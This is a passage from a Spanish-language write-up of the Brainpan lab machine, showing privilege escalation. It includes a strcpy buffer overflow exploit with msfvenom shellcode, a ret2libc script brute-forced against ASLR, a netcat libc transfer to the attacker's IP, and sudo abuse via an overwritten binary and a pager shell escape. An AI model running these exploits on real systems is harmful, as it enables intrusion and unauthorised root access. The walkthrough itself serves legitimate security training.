  i </span><span class="o">= </span><span class="mi">0</span><span class="p">;
  </span><span class="no">while</span><span class="p">( </span><span class="mi">true</span><span class="p"> ) {
    sVar1 </span><span class="o">= </span><span class="no">strlen</span><span class="p">(s);
    </span><span class="o">if</span><span class="p"> (sVar1 </span><span class="o"><=</span><span class="p"> (</span><span class="na">uint</span><span class="p">)i) {
      </span><span class="no">strcpy</span><span class="p">(buf,s);
      </span><span class="o">return </span><span class="p">buf;
    }
    </span><span class="o">if</span><span class="p"> (s[i] </span><span class="o">==</span><span class="s"> 'F'</span><span class="p">) </span><span class="o">break</span><span class="p">;
    i </span><span class="o">=</span><span class="p"> i </span><span class="o">+ </span><span class="mi">1</span><span class="p">;
  }
  </span><span class="no">printf</span><span class="p">(</span><span class="s">"failed: </span><span class="mi">%x\n</span><span class="s">"</span><span class="p">,(</span><span class="no">int</span><span class="p">)s[i]);
                    </span><span class="c1">/* WARNING: Subroutine does not return */  </span><span class="p">
  </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
}</span>
</code></pre></div></div><br>

<p class="plain-text">Primero podemos ver que define un total de <code class="language-plaintext highlighter-rouge">100</code> bytes de <code class="language-plaintext highlighter-rouge">buffer</code> y usa la función <code class="language-plaintext highlighter-rouge">strcpy</code> con el argumento por lo que puede que sea vulnerable a <code class="language-plaintext highlighter-rouge">Buffer Overflow</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">char </span><span class="p">buf [</span><span class="mi">100</span><span class="p">];  
</span><span class="no">strcpy</span><span class="p">(buf,s);</span>
</code></pre></div></div><br>

<p class="plain-text">Pero en caso de que el caracter <code class="language-plaintext highlighter-rouge">F</code> este en el input se cortará donde este el caracter y omitira el resto, hay que tener esto en cuenta por posibles problemas más adelante</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">if</span><span class="p"> (s[i] </span><span class="o">==</span><span class="s"> 'F'</span><span class="p">) </span><span class="o">break</span><span class="p">;  
i </span><span class="o">=</span><span class="p"> i </span><span class="o">+ </span><span class="mi">1</span><span class="p">;</span>
</code></pre></div></div><br>

<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">checksec</code> podemos ver que el binario no tiene ninguna <code class="language-plaintext highlighter-rouge">protección</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ checksec </span><span class="p">validate
[</span><span class="az">*</span><span class="p">] '/home/kali/validate'
    Arch:     i386-32-little
    RELRO:    </span><span class="am">Partial RELRO</span><span class="p">
    Stack:    </span><span class="ro">No canary found</span><span class="p">
    NX:       </span><span class="ro">NX disabled</span><span class="p">
    PIE:      </span><span class="ro">No PIE (0x8048000)</span><span class="p">  
    RWX:      </span><span class="ro">Has RWX segments</span>
</code></pre></div></div><br>

<p class="plain-text">Iniciamos creando un <code class="language-plaintext highlighter-rouge">patrón</code> de caracteres de <code class="language-plaintext highlighter-rouge">125</code> bytes com <code class="language-plaintext highlighter-rouge">msf-pattern_create</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msf-pattern_create</span><span class="p"> -l 125
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae  </span>
</code></pre></div></div><br>

<p class="plain-text">Abrimos <code class="language-plaintext highlighter-rouge">gdb</code> y corremos el programa pasandole el patrón de caracteres como <code class="language-plaintext highlighter-rouge">argumento</code>, al pasar de el buffer asignado este corrompe y nos muestra <code class="language-plaintext highlighter-rouge">registros</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ gdb </span><span class="p">-q ./validate
Reading symbols from </span><span class="ve">./validate</span><span class="p">...
</span><span class="ro">gdb-peda$ </span><span class="p">run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae
Starting program: </span><span class="ve">/home/kali/validate </span><span class="p">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae  
[Thread debugging using libthread_db enabled]
Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".

Program received signal SIGSEGV, Segmentation fault.
</span><span class="az">
[----------------------------------registers-----------------------------------]</span><span class="p">
</span><span class="ve">EAX</span><span class="p">: </span><span class="az">0xffffd548</span><span class="p"> ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae")
</span><span class="ve">EBX</span><span class="p">: 0x41366441 ('Ad6A')
</span><span class="ve">ECX</span><span class="p">: </span><span class="az">0xffffd900</span><span class="p"> ("d9Ae0Ae")
</span><span class="ve">EDX</span><span class="p">: </span><span class="az">0xffffd5be</span><span class="p"> ("d9Ae0Ae")
</span><span class="ve">ESI</span><span class="p">: </span><span class="ro">0x80485b0</span><span class="p"> (<__libc_csu_init>:	push   ebp)
</span><span class="ve">EDI</span><span class="p">: </span><span class="ve">0xf7ffcb80</span><span class="p"> --> 0x0 
</span><span class="ve">EBP</span><span class="p">: 0x64413764 ('d7Ad')
</span><span class="ve">ESP</span><span class="p">: </span><span class="az">0xffffd5c0</span><span class="p"> ("Ae0Ae")
</span><span class="ve">EIP</span><span class="p">: 0x39644138 ('8Ad9')
</span><span class="ve">EFLAGS</span><span class="p">: 0x10286 (</span><span class="ve">carry </span><span class="ro">PARITY </span><span class="ve">adjust zero </span><span class="ro">SIGN </span><span class="ve">trap </span><span class="ro">INTERRUPT </span><span class="ve">direction overflow</span><span class="p">)
</span><span class="az">[-------------------------------------code-------------------------------------]</span><span class="ro">
Invalid $PC address: 0x39644138</span><span class="az">
[------------------------------------stack-------------------------------------]</span><span class="p">
0000| </span><span class="az">0xffffd5c0</span><span class="p"> ("Ae0Ae")
0004| </span><span class="az">0xffffd5c4</span><span class="p"> --> 0xf7fc0065 
0008| </span><span class="az">0xffffd5c8</span><span class="p"> --> </span><span class="az">0xf7fc1b30</span><span class="p"> --> </span><span class="ve">0xf7c1f2bc</span><span class="p"> ("GLIBC_PRIVATE")
0012| </span><span class="az">0xffffd5cc</span><span class="p"> --> 0x1 
0016| </span><span class="az">0xffffd5d0</span><span class="p"> --> 0x1 
0020| </span><span class="az">0xffffd5d4</span><span class="p"> --> 0x0 
0024| </span><span class="az">0xffffd5d8</span><span class="p"> --> 0x0 
0028| </span><span class="az">0xffffd5dc</span><span class="p"> --> 0x0 
</span><span class="az">[------------------------------------------------------------------------------]</span><span class="p">
</span><span class="p">Legend: </span><span class="ro">code</span><span class="p">, </span><span class="az">data</span><span class="p">, </span><span class="ve">rodata</span><span class="p">, value
Stopped reason: </span><span class="ro">SIGSEGV
</span><span class="az">0x39644138 </span><span class="p">in</span><span class="am"> ?? </span><span class="p">()
</span><span class="ro">gdb-peda$ </span>
</code></pre></div></div><br>

<p class="plain-text">A <code class="language-plaintext highlighter-rouge">msf-pattern_offset</code> le pasamos el valor de <code class="language-plaintext highlighter-rouge">EIP</code> <code class="language-plaintext highlighter-rouge">0x39644138</code> y conseguimos el <code class="language-plaintext highlighter-rouge">offset</code> que son <code class="language-plaintext highlighter-rouge">116</code> bytes necesarios antes de sobreescribir el registro <code class="language-plaintext highlighter-rouge">EIP</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msf-pattern_offset</span><span class="p"> -q 0x39644138  
[*] Exact match at offset 116</span>
</code></pre></div></div><br>

<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">objdump</code> no encontramos instrucciónes con el <code class="language-plaintext highlighter-rouge">ESP</code> de las que podamos aprovecharnos sin embargo si buscamos <code class="language-plaintext highlighter-rouge">CALL EAX</code> encontramos 2 matches</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msf-nasm_shell </span><span class="p">
nasm > CALL EAX
00000000  FFD0              call eax  
nasm ></span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ objdump</span><span class="p"> -D validate | </span><span class="ve">grep</span><span class="p"> -i </span><span class="am">"ff d0"</span><span class="p">
 80484af:	</span><span class="ro">ff d0</span><span class="p">                	call   *%eax
 804862b:	</span><span class="ro">ff d0</span><span class="p">                	call   *%eax  </span>
</code></pre></div></div><br>

<p class="plain-text">Cualquiera de las 2 direcciones para <code class="language-plaintext highlighter-rouge">CALL EAX</code> es válida en este caso usare la segunda pero hay que darle la vuelta ya que estamos en <code class="language-plaintext highlighter-rouge">little endian</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">\x08\x04\x86\x2b     </span><span class="o">--></span><span class="p">     \x2b\x86\x04\x08  </span>
</code></pre></div></div><br>

<p class="plain-text">Podemos empezar a crear un script definiendo el <code class="language-plaintext highlighter-rouge">offset</code> y la dirección de <code class="language-plaintext highlighter-rouge">CALL EAX</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="p">
offset </span><span class="o">= </span><span class="mi">116
</span><span class="p">
calleax </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x2b\x86\x04\x08</span><span class="s">"  </span>
</code></pre></div></div><br>

<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">msfvenom</code> creamos un <code class="language-plaintext highlighter-rouge">shellcode</code> que nos ejecute una <code class="language-plaintext highlighter-rouge">/bin/sh</code> indicando 2 badchars <code class="language-plaintext highlighter-rouge">\x00</code> y <code class="language-plaintext highlighter-rouge">\x46</code> ya que en el codigo vimos que <code class="language-plaintext highlighter-rouge">F</code> nos puede dar problemas</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom</span><span class="p"> -p linux/x86/exec CMD=/bin/sh -f python -v shellcode -b </span><span class="am">'\x00\x46'</span><span class="p">
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload  
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
Final size of python file: 416 bytes
shellcode =  b""
shellcode += b"\xbb\xc8\xe1\x1a\x03\xdb\xd0\xd9\x74\x24\xf4"
shellcode += b"\x5a\x33\xc9\xb1\x0b\x83\xc2\x04\x31\x5a\x11"
shellcode += b"\x03\x5a\x11\xe2\x3d\x8b\x11\x5b\x24\x1e\x40"
shellcode += b"\x33\x7b\xfc\x05\x24\xeb\x2d\x65\xc3\xeb\x59"
shellcode += b"\xa6\x71\x82\xf7\x31\x96\x06\xe0\x4a\x59\xa6"
shellcode += b"\xf0\x65\x3b\xcf\x9e\x56\xc8\x67\x5f\xfe\x7d"
shellcode += b"\xfe\xbe\xcd\x02"</span>
</code></pre></div></div><br>

<p class="plain-text">Agregamos el <code class="language-plaintext highlighter-rouge">shellcode</code> al script y rellenamos con <code class="language-plaintext highlighter-rouge">A</code> hasta llegar al registro <code class="language-plaintext highlighter-rouge">EIP</code>, en el volveremos con la dirección de <code class="language-plaintext highlighter-rouge">CALL EAX</code> y asi se ejecutara el shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="p">
offset </span><span class="o">= </span><span class="mi">116
</span><span class="p">
calleax </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x2b\x86\x04\x08</span><span class="s">"</span><span class="p">

shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xbb\xc8\xe1\x1a\x03\xdb\xd0\xd9\x74\x24\xf4</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5a\x33\xc9\xb1\x0b\x83\xc2\x04\x31\x5a\x11</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x03\x5a\x11\xe2\x3d\x8b\x11\x5b\x24\x1e\x40</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x33\x7b\xfc\x05\x24\xeb\x2d\x65\xc3\xeb\x59</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa6\x71\x82\xf7\x31\x96\x06\xe0\x4a\x59\xa6</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xf0\x65\x3b\xcf\x9e\x56\xc8\x67\x5f\xfe\x7d</span><span class="s">"</span><span class="p">  
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfe\xbe\xcd\x02</span><span class="s">"</span><span class="p">

junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">*</span><span class="p"> (offset </span><span class="o">-</span><span class="no"> len</span><span class="p">(shellcode))

</span><span class="no">print</span><span class="p">(shellcode </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">calleax)</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro payload sera el siguiente, iniciamos por un <a href="https://www.exploit-db.com/shellcodes/46907">shellcode</a> en x86 que ejecute una <code class="language-plaintext highlighter-rouge">/bin/sh</code>, despues rellenamos con <code class="language-plaintext highlighter-rouge">A's</code> hasta llegar al <code class="language-plaintext highlighter-rouge">RIP</code> y hacemos que este apunte a la direccion de la intrucción <code class="language-plaintext highlighter-rouge">call eax</code>, esta instruccion interpretara el registro <code class="language-plaintext highlighter-rouge">eax</code> donde esta el inicio de nuestro <code class="language-plaintext highlighter-rouge">input</code> y ejecutara nuestro <code class="language-plaintext highlighter-rouge">shellcode</code></p>
<a href="/thm/brainpan/16.png" target="_blank"><div><p><img src="/thm/brainpan/16.png"></p></div></a>

<p class="plain-text">Ejecutamos el binario <code class="language-plaintext highlighter-rouge">validate</code> en la máquina victima con el exploit ejecutado como <code class="language-plaintext highlighter-rouge">validate</code>, al hacerlo conseguimos una <code class="language-plaintext highlighter-rouge">shell</code> como el usuario <code class="language-plaintext highlighter-rouge">anansi</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ validate $(python2 exploit.py)  
$ whoami
anansi
$ hostname -I
10.10.27.47
$</span>
</code></pre></div></div><br>

<p class="plain-text">Otro metodo es explotarlo mediante un <code class="language-plaintext highlighter-rouge">ret2libc</code>, para esto necesitamos saber la libreria que usa el binario que en este caso con <code class="language-plaintext highlighter-rouge">ldd</code> vemos que es <code class="language-plaintext highlighter-rouge">libc.so.6</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ ldd /usr/local/bin/validate  
	linux-gate.so.1 =>  (0xb77d5000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7621000)  
	/lib/ld-linux.so.2 (0xb77d6000)
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Descargamos el archivo <code class="language-plaintext highlighter-rouge">libc.so.6</code> con <code class="language-plaintext highlighter-rouge">netcat</code> de la misma manera que antes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ netcat 10.8.64.87 4444 < /lib/i386-linux-gnu/libc.so.6  
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ netcat</span><span class="p"> -lvnp 4444 > libc.so.6  
Listening on 0.0.0.0 4444
Connection received on 10.10.27.47  </span>
</code></pre></div></div><br>

<p class="plain-text">Para empezar tomaremos como <code class="language-plaintext highlighter-rouge">base</code> una dirección de <code class="language-plaintext highlighter-rouge">libc</code> usando <code class="language-plaintext highlighter-rouge">ldd</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ ldd /usr/local/bin/validate
        linux-gate.so.1 =>  (0xb7719000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7565000)  
        /lib/ld-linux.so.2 (0xb771a000)
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">readelf</code> conseguimos <code class="language-plaintext highlighter-rouge">offsets</code> de las direcciones para <code class="language-plaintext highlighter-rouge">exit</code> y <code class="language-plaintext highlighter-rouge">system</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ readelf</span><span class="p"> -s libc.so.6 | </span><span class="ve">grep</span><span class="p"> -E </span><span class="am">" system@@| exit@@"</span><span class="p">
   136: 00032fb0    45 FUNC    GLOBAL DEFAULT   12 </span><span class="ro">exit@@</span><span class="p">GLIBC_2.0
  1422: 0003f430   141 FUNC    WEAK   DEFAULT   12 </span><span class="ro">system@@</span><span class="p">GLIBC_2.0  </span>
</code></pre></div></div><br>

<p class="plain-text">Para conseguir un <code class="language-plaintext highlighter-rouge">offset</code> de la dirección de <code class="language-plaintext highlighter-rouge">/bin/sh</code> podemos usar <code class="language-plaintext highlighter-rouge">strings</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ strings </span><span class="p">-a -t x libc.so.6 | </span><span class="ve">grep</span><span class="p"> /bin/sh  
 160f58 </span><span class="ro">/bin/sh</span>
</code></pre></div></div><br>

<p class="plain-text">Tenemos las 3 direcciones necesitadas para <code class="language-plaintext highlighter-rouge">ret2libc</code>: <code class="language-plaintext highlighter-rouge">system</code> <code class="language-plaintext highlighter-rouge">exit</code> y <code class="language-plaintext highlighter-rouge">/bin/sh</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="mi">0x0003f430     </span><span class="o">--></span><span class="p">     system
</span><span class="mi">0x00032fb0     </span><span class="o">--></span><span class="p">     exit
</span><span class="mi">0x00160f58     </span><span class="o">--></span><span class="p">     /bin/sh  </span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo estas direcciones son solo <code class="language-plaintext highlighter-rouge">offsets</code>, para conseguir la direccion real necesitamos sumarle la dirección de <code class="language-plaintext highlighter-rouge">libc base</code> que tenemos de antes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ gdb</span><span class="p"> -q 
</span><span class="ro">gdb-peda$ </span><span class="p">p 0xb7565000 + 0x0003f430
$1 = 0xb75a4430
</span><span class="ro">gdb-peda$ </span><span class="p">p 0xb7565000 + 0x00032fb0
$2 = 0xb7597fb0
</span><span class="ro">gdb-peda$ </span><span class="p">p 0xb7565000 + 0x00160f58  
$3 = 0xb76c5f58
</span><span class="ro">gdb-peda$</span>
</code></pre></div></div><br>

<p class="plain-text">Ya sumamos las direcciones con <code class="language-plaintext highlighter-rouge">gdb</code> para obtener direcciones <code class="language-plaintext highlighter-rouge">reales</code> pero necesitamos darles la vuelta a una por una ya que estamos en <code class="language-plaintext highlighter-rouge">little endian</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="mi">0xb75a4430</span><span class="o">   -->   </span><span class="p">\xb7\x5a\x44\x30   </span><span class="o">-->   </span><span class="p">\x30\x44\x5a\xb7   </span><span class="c1"># system
</span><span class="mi">0xb7597fb0</span><span class="o">   -->   </span><span class="p">\xb7\x59\x7f\xb0   </span><span class="o">-->   </span><span class="p">\xb0\x7f\x59\xb7   </span><span class="c1"># exit
</span><span class="mi">0xb76c5f58</span><span class="o">   -->   </span><span class="p">\xb7\x6c\x5f\x58   </span><span class="o">-->   </span><span class="p">\x58\x5f\x6c\xb7   </span><span class="c1"># /bin/sh  </span>
</code></pre></div></div><br>

<p class="plain-text">Plasmamos el <code class="language-plaintext highlighter-rouge">junk</code> y las <code class="language-plaintext highlighter-rouge">direcciones</code> en un script de python y las printeamos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="p">
offset </span><span class="o">= </span><span class="mi">116</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

addr_system </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x30\x44\x5a\xb7</span><span class="s">" </span><span class="p">
addr_exit </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb0\x7f\x59\xb7</span><span class="s">" </span><span class="p">
addr_bin_sh </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x58\x5f\x6c\xb7</span><span class="s">"</span><span class="p">

</span><span class="no">print</span><span class="p">(junk </span><span class="o">+ </span><span class="p">addr_system </span><span class="o">+ </span><span class="p">addr_exit </span><span class="o">+ </span><span class="p">addr_bin_sh)  </span>
</code></pre></div></div><br>

<p class="plain-text">De esta manera en el <code class="language-plaintext highlighter-rouge">EIP</code> ejecutariamos <code class="language-plaintext highlighter-rouge">system()</code> como función, <code class="language-plaintext highlighter-rouge">exit()</code> como función de <code class="language-plaintext highlighter-rouge">retorno</code> y le pasaremos la string <code class="language-plaintext highlighter-rouge">/bin/sh</code> como <code class="language-plaintext highlighter-rouge">argumento</code> a system()</p>
<a href="/thm/brainpan/17.png" target="_blank"><div><p><img src="/thm/brainpan/17.png"></p></div></a>

<p class="plain-text">Sin embargo tenemos un problema y es que la dirección de <code class="language-plaintext highlighter-rouge">libc base</code> cambia constantemente, esto es porque el <code class="language-plaintext highlighter-rouge">ASLR</code> esta activado y hay aleatorizacion</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ ldd /usr/local/bin/validate 
    linux-gate.so.1 =>  (0xb77ce000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb761a000)  
    /lib/ld-linux.so.2 (0xb77cf000)
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /proc/sys/kernel/randomize_va_space
2
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo en <code class="language-plaintext highlighter-rouge">x86</code> las direcciones son tan <code class="language-plaintext highlighter-rouge">pequeñas</code> que despues de ejecutar el binario varias veces la dirección de libc <code class="language-plaintext highlighter-rouge">base</code> vuelve a <code class="language-plaintext highlighter-rouge">coincidir</code> varias veces</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ for i in $(seq 1 1000); do ldd /usr/local/bin/validate | grep 0xb7565000; done  
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (</span><span class="ro">0xb7565000</span><span class="p">)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (</span><span class="ro">0xb7565000</span><span class="p">)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (</span><span class="ro">0xb7565000</span><span class="p">)
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Asi que es caso de ejecutarlo en <code class="language-plaintext highlighter-rouge">bucle</code> hasta que consigamos una sh como <code class="language-plaintext highlighter-rouge">anansi</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ while true; do validate $(python2 exploit.py); done  
Segmentation fault
Segmentation fault
Segmentation fault
$ whoami
anansi
$ hostname -I
10.10.27.47
$</span>
</code></pre></div></div><br>
</section>

</section>

<section class="post" id="shell-root">
<br><h3 class="post-title">Shell - root</h3><br>

<p class="plain-text">A nivel de <code class="language-plaintext highlighter-rouge">sudoers</code> podemos ejecutar como <code class="language-plaintext highlighter-rouge">root</code> sin contraseña <code class="language-plaintext highlighter-rouge">anansi_util</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">$ sudo -l
Matching Defaults entries for anansi on this host:
    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
$</span>
</code></pre></div></div><br>

<p class="plain-text">Si miramos los privilegios del binario nuestro usuario actual <code class="language-plaintext highlighter-rouge">anansi</code> es el propietario</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">$ ls -l /home/anansi/bin/anansi_util
-rwxr-xr-x 1 anansi anansi 7256 Mar  4  2013 /home/anansi/bin/anansi_util  
$</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos copiar la <code class="language-plaintext highlighter-rouge">bash</code> hacia esa ruta del binario especifica y al ejecutarlo con <code class="language-plaintext highlighter-rouge">sudo</code> es como si ejecutaramos <code class="language-plaintext highlighter-rouge">sudo bash</code> asi nos convertimos en <code class="language-plaintext highlighter-rouge">root</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">$ cp /bin/bash /home/anansi/bin/anansi_util
$ sudo /home/anansi/bin/anansi_util
</span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p"># id
uid=0(root) gid=0(root) groups=0(root)
</span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I       
10.10.27.47
</span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p"># cat /root/b.txt 

_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


                                              http://www.techorganic.com  

</span><span class="ve">root@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
</code></pre></div></div><br>

<p class="plain-text">Es necesario mencionar que el <code class="language-plaintext highlighter-rouge">Buffer Overflow</code> de la escalada es opcional ya que a nivel de sudoers de <code class="language-plaintext highlighter-rouge">puck</code> tenemos el binario <code class="language-plaintext highlighter-rouge">anansi_util</code> veamos que hace</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo -l
Matching Defaults entries for puck on this host:
    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Tenemos varias opciones entre ellas <code class="language-plaintext highlighter-rouge">manual</code>, podemos desplegar el manual del comando <code class="language-plaintext highlighter-rouge">whoami</code> y entra en un modo <code class="language-plaintext highlighter-rouge">paginate</code>, ejecutamos <code class="language-plaintext highlighter-rouge">!bash</code> y somos root</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo /home/anansi/bin/anansi_util manual whoami

NAME
       whoami - print effective userid

SYNOPSIS
       whoami [OPTION]...

DESCRIPTION
       Print the user name associated with the current effective user ID  

       --help display this help and exit

       --version
              output version information and exit

